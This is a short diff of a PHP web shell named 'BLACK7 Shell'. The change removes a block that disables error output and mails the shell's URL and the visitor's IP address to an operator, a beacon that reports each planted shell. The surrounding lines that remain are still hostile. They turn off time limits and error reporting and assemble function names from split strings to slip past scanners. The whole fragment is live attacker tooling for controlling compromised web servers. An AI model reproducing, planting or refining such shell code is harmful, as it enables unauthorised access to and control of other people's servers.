@@ -118,14 +118,6 @@ echo '<font face="Bungee" size="7">BLA'.'C'.'K'.'7 Sh'.'el'.'l</font></center>
 <tr><td>';
 set_time_limit(0);
 error_reporting(0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$to = '';
-$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($to, "Result Logger Mu | 0x4u", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 
 $gcw = "ge"."tc"."wd";
 $exp = "ex"."plo"."de";
